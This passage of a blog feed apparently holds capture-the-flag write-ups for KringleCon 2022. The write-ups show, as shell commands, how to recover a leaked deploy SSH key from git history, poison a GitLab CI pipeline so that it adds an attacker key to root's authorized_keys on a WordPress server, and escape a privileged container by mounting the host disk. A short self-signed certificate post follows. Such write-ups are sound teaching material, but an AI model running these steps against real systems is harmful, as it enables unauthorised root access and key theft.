+<p>All thats left to do now is grab the flag, now for all intents and purposes I won’t show the flag, so go ahead and try the challenge yourself, It was a great challenge and you will learn a lot about git.
+<img src="/images/kringlecon2022/jollycicd/jollycicd-19.png" alt="Alt text" title="flag.txt" /></p>]]></content><author><name>Tijjy</name></author><summary type="html"><![CDATA[Hello, this is my write up of the Jolly CI/CD challenge for kringlecon 2022. The aim of this challenge is to expoit the CI/CD pipeline and gain access to the wordpress server. I can say this is a pretty difficult challenge and really gets you thinking. The challenge requires knowledge of git and how CI/CD pipelines work. Note: This challenge does take 4-5 minutes to start all of the containers required for the challenge. Below here we have the starting terminal which you see when starting the challenge. Typically the first thing I do when I have a shell whether it be a vm or container is check whether I have sudo privileges, most often than not low privilege users are given more sudo privileges than they actually need, this creates a security risk and path for an attacker to escalate to root. This was shown in the Prison escape write up I did which can be found here -&gt; Prison Escape Writeup To check what sudo privileges you have can be done with the following command. sudo -l It looks like we can run sudo without any password so lets go ahead and escalate to root sudo bash whoami Now the target is not on the box we are currently on, as mentioned in the challenge instructions we need to exploit the wordpress server. Lets go ahead and get our ip address and then use the tool nmap to scan the local subnet and attempt to the the IP addresses of the targets. ip a | grep inet I will use the following command to scan the local subnet. nmap -T4 -v 172.18.0.0/16 Once the scan is completed you will see we found the targets. Although there are multiple hosts that were returned, we only need to worry about the following hosts 172.18.0.88 wordpress.local_docker_network 172.18.0.150 gitlab.local_docker_network Now since we have no way of viewing the gitlab site via a GUI, we will need to use curl to take advantage of the gitlab api to view all public repositories to see what we can clone and possibly exploit. This can be done by running the following command and piping the output into jq to parse the json response. curl --request GET "http://gitlab.local_docker_network/api/v4/projects" | jq If successful you will see the following output, indicating that there is a public git repository we can clone called “Wordpress.Flag.Net.Internal” indicating it might be the source code of the wordpress site we need to exploit. Lets go ahead and clone the git repo and take a look what is inside. git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git Looking at the gitlab-ci.yml file, it looks like the repo utilises a gitlab CI/CD pipeline to push changes to the wordpress server, take note as we can take advantage of this to gain acess to the target server if we can find a way to push changes to the git repository. cat .gitlab-ci.yml One thing developers do with git repositories is forget to gitignore secrets or accidentally commit secrets to a git repo. More often than not developers will push another commit removing these secrets without realising that the secrets are still there, just in previous commits. Lets go ahead and do a git log to see what the previous commit comments look like. git log Now we can see all the previous commits that have been made. using a command git diff you can actually see the changes to each file that was made, such as removing or adding in secrets. A commit that caught my eye was the commit with the message “whoops”, I think the developer made a mistake, lets do a git diff between that commit and the previous commit to see what was changed. Grab the commit hashes of the commits you want to compare and run git diff against them git diff abdea0ebb21b156c01f7533cea3b895c26198c98 e19f653bde9ea3de6af21a587e41e7a909db1ca5 Wow look at that, the developer accidentally added in an ssh private key named “.deploy” and attempted to remove it from the git repo by doing another commit to remove it. Notice how the ssh key is named “.deploy” this might indicate this ssh key is used to push changes to the git repo. Lets try and take advantage of this. Copy the key into a file such as “key.pem” and remove all the extra dashes (“-“) that the commit diff added in. The result should look like this. Don’t forget to change the key permissions to 0600 otherwise openssh will error out. chmod 0600 key.pem Now that we can push to the git repo using this ssh private key, lets go ahead and make our own ssh keypair that we can push to the wordpress server by abusing the gitlab CI/CD pipeline. Generate a keypair with the following command and just hit enter until done. ssh-keygen Now cat the public key you just created. Take note of the public key as we will be putting the output into the .gitlab-ci.yml file next. cat /home/samways/.ssh/id_rsa.pub We will now write a oneliner command to add into the CI/CD pipeline scripts to add our ssh key to the wordpress root users keys. ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBAKLEGKk85jbmxLc4U6n1t7AgZeNeGnEJcagj+/DbCKsOTKCdscARbTncPU/QwlTFJqIb+bja9s2ms5c7dG9Xzut3Ga21IrtbB1uVOtDPVnRZt0uej1usRyndWWYVWRCZU15wdhUNyRzHNsnkv7xDyxf4cp25+h362a+U8hI2irWlgKWQCwHY88XUBjKkdr7NKOlnGm7I6aJfFsz5Owf0vY3nFrX1ija2UrsEAq8/XmbFrj776tlLsKxf+sjA+cCuvk5YLaggkoE/DeI9pqAhX283/C9Q5UNVKof7W/Y2U2JveF2bbuC/CEGKhAID8rwdosjAFlmq7uD+UkkHKTlVawWSh1OSF9fxTbL5+ou33nfhz4kp/A7nLcb0VTdTzoSXKE46puFlD61Gdl7zUDa/ry2NmWrQ3tCfoLSd35uysbbEiO+19tFyIb+nNKVRhhWJV2F8SAxF3X/eEvNxMOjdsvxaZAEflWJUOJMtJT6JaOrJY15aVTiHvcTyQXFFMKk= samways@grinchum-land.flag.net.internal" &gt;&gt; /root/.ssh/authorized_keys' Add the oneliner command above, replacing the my public key with yours, into the script: section in the .gitlab-ci.yml file as seen below. We need to do one more step to be able to push to the repo, run the following commands, replacing the Identity file location to wherever you stored the ssh private key you found in the git logs. mkdir /root/.ssh nano /root/.ssh/config Paste in the following config Host gitlab.flag.net.internal HostName gitlab.flag.net.internal User git IdentityFile /home/samways/wordpress.flag.net.internal/key.pem What we just did was create an ssh config for the user git at the gitlab hostname. Now when we attempt to git push using ssh, it will know which ssh key to use when authenticating. Awesome, now we are good to go and push our changes and take over the wordpress server. In order, run the following commands to add your file changes, commit the changes with a message, and push the changes to the git repo. git add . git status git commit -m "wordpress takeover" git push Epic, now we have successfully pushed our changes, lets go ahead and see if it worked and attempt to authenticate to the wordpress server as root using our privatekey we generate earlier. My private key was stored here -&gt; /home/samways/.ssh/id_rsa ssh -i id_rsa root@wordpress.flag.net.internal Look at that, we did it, we successfully found secrets in a public git repository, exploited the CI/CD pipeline and gained root access to the target wordpress server. All thats left to do now is grab the flag, now for all intents and purposes I won’t show the flag, so go ahead and try the challenge yourself, It was a great challenge and you will learn a lot about git.]]></summary></entry><entry><title type="html">KringleCon 2022 Prison Escape</title><link href="http://localhost:4000/2022-12-11/prison-escape" rel="alternate" type="text/html" title="KringleCon 2022 Prison Escape" /><published>2022-12-11T00:00:00+08:00</published><updated>2022-12-11T00:00:00+08:00</updated><id>http://localhost:4000/2022-12-11/prison-escape</id><content type="html" xml:base="http://localhost:4000/2022-12-11/prison-escape"><![CDATA[<p>Hello, this is my write up of the Prison Escape challenge for kringlecon 2022.</p>
+
+<p>The aim of this challenge is to escape a container aka a container breakout. I must admit I did run down a rabbit hole when doing my first attempt but once I realised the answer it became quite obvious.</p>
+
+<p>Below here we have the starting terminal which you see when starting the challenge.
+<img src="/images/kringlecon2022/prisonescape/prisonescape-01.png" alt="Alt text" title="Starting screen" /></p>
+
+<p>Typically the first thing I do when I have a shell whether it be a vm or container is check whether I have sudo privileges, most often than not low privilege users are given more sudo privileges than they actually need, this creates a security risk and path for an attacker to escalate to root.</p>
+
+<p>To check what sudo privileges you have can be done with the following command.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo</span> <span class="nt">-l</span></code></pre></figure>
+
+<p>When you run the command you should see this output.
+<img src="/images/kringlecon2022/prisonescape/prisonescape-02.png" alt="Alt text" title="sudo -l" /></p>
+
+<p>Taking a look at the output seen above, We can immidiately see our current user can run any command with sudo requiring no password at all!</p>
+
+<p>Now lets escalate to root with the good ole sudo bash and confirm we are root.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo </span>bash
+<span class="nb">whoami</span></code></pre></figure>
+
+<p><img src="/images/kringlecon2022/prisonescape/prisonescape-03.png" alt="Alt text" title="sudo bash" /></p>
+
+<p>Upon doing some research into privileged containers I came across an article by trendmicro detailing the –privileged flag for containers and how it can be abused by an attacker to gain access to the host system.<br />
+Article: <a href="https://www.trendmicro.com/en_us/research/19/l/why-running-a-privileged-container-in-docker-is-a-bad-idea.html">why-running-a-privileged-container-in-docker-is-a-bad-idea</a></p>
+
+<p>Further down in the article there is a section explaining that a privileged container has the capability to list as mount the host devices.
+<img src="/images/kringlecon2022/prisonescape/prisonescape-04.png" alt="Alt text" title="mounting host devices" /></p>
+
+<p>Lets take a look at prison escape container and see if we can list the host devices in /dev.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">ls</span> /dev</code></pre></figure>
+
+<p><img src="/images/kringlecon2022/prisonescape/prisonescape-05.png" alt="Alt text" title="listing host devices" /></p>
+
+<p>Listing the devices we can see all the standard devices a linux system would have, what caught my eye was the device “vda”, this has the naming standard that I see commonly when creating linux partitions which could be vda, sda, xda from past experience.</p>
+
+<p>Lets go ahead and try to mount the vda device. We can do that with the following commands.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">mkdir</span> /mnt/vda
+mount /dev/vda /mnt/vda
+<span class="nb">cd</span> /mnt/vda</code></pre></figure>
+
+<p><img src="/images/kringlecon2022/prisonescape/prisonescape-06.png" alt="Alt text" title="mounting the vda device" /></p>
+
+<p>It looks like it mounted without errors, now lets see whats in it.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">ls</span></code></pre></figure>
+
+<p><img src="/images/kringlecon2022/prisonescape/prisonescape-07.png" alt="Alt text" title="listed /mnt/vda" /></p>
+
+<p>Wow look at that, we have just mounted the host filesystem. Since this container was started with the “–privileged” flag it has the capability to see and mount the host filesystem as we just did.</p>
+
+<p>Lets go ahead and get the flag which resides in the user “jailer”s’ private key. Now for the purpose of the challenge I’m not going to show the flag so you can atleast go do the challenge yourself and get the experience of breaking out of a container.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat </span>home/jailer/.ssh/jail.key.priv</code></pre></figure>
+
+<p><img src="/images/kringlecon2022/prisonescape/prisonescape-08.png" alt="Alt text" title="catting the jailers private key" /></p>
+
+<p>Thats it, we successfully completed the prison escape challenge, now go ahead and do it yourself. I personally liked this challenge as I’m quite a fan of containers!</p>]]></content><author><name>Tijjy</name></author><summary type="html"><![CDATA[Hello, this is my write up of the Prison Escape challenge for kringlecon 2022. The aim of this challenge is to escape a container aka a container breakout. I must admit I did run down a rabbit hole when doing my first attempt but once I realised the answer it became quite obvious. Below here we have the starting terminal which you see when starting the challenge. Typically the first thing I do when I have a shell whether it be a vm or container is check whether I have sudo privileges, most often than not low privilege users are given more sudo privileges than they actually need, this creates a security risk and path for an attacker to escalate to root. To check what sudo privileges you have can be done with the following command. sudo -l When you run the command you should see this output. Taking a look at the output seen above, We can immidiately see our current user can run any command with sudo requiring no password at all! Now lets escalate to root with the good ole sudo bash and confirm we are root. sudo bash whoami Upon doing some research into privileged containers I came across an article by trendmicro detailing the –privileged flag for containers and how it can be abused by an attacker to gain access to the host system. Article: why-running-a-privileged-container-in-docker-is-a-bad-idea Further down in the article there is a section explaining that a privileged container has the capability to list as mount the host devices. Lets take a look at prison escape container and see if we can list the host devices in /dev. ls /dev Listing the devices we can see all the standard devices a linux system would have, what caught my eye was the device “vda”, this has the naming standard that I see commonly when creating linux partitions which could be vda, sda, xda from past experience. Lets go ahead and try to mount the vda device. We can do that with the following commands. mkdir /mnt/vda mount /dev/vda /mnt/vda cd /mnt/vda It looks like it mounted without errors, now lets see whats in it. ls Wow look at that, we have just mounted the host filesystem. Since this container was started with the “–privileged” flag it has the capability to see and mount the host filesystem as we just did. Lets go ahead and get the flag which resides in the user “jailer”s’ private key. Now for the purpose of the challenge I’m not going to show the flag so you can atleast go do the challenge yourself and get the experience of breaking out of a container. cat home/jailer/.ssh/jail.key.priv Thats it, we successfully completed the prison escape challenge, now go ahead and do it yourself. I personally liked this challenge as I’m quite a fan of containers!]]></summary></entry><entry><title type="html">Generate a self-signed SSL certificate and key</title><link href="http://localhost:4000/2022-12-10/generate-selfsigned-ssl-cert-copy" rel="alternate" type="text/html" title="Generate a self-signed SSL certificate and key" /><published>2022-12-10T00:00:00+08:00</published><updated>2022-12-10T00:00:00+08:00</updated><id>http://localhost:4000/2022-12-10/generate-selfsigned-ssl-cert%20copy</id><content type="html" xml:base="http://localhost:4000/2022-12-10/generate-selfsigned-ssl-cert-copy"><![CDATA[<p>To generate a quick and easy self signed certificate and private key, run the following command with any system that has openssl installed.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">openssl req <span class="nt">-x509</span> <span class="nt">-newkey</span> rsa:4096 <span class="nt">-keyout</span> key.pem <span class="nt">-out</span> cert.pem <span class="nt">-sha256</span> <span class="nt">-days</span> 365 <span class="nt">--nodes</span></code></pre></figure>
+
+<p>There is a code snipped of the command here -&gt; <a href="https://gitlab.tijns.net/-/snippets/2/raw/master/certkeygen.sh">snippet</a></p>]]></content><author><name>Tijjy</name></author><summary type="html"><![CDATA[To generate a quick and easy self signed certificate and private key, run the following command with any system that has openssl installed. openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365 --nodes There is a code snipped of the command here -&gt; snippet]]></summary></entry></feed>
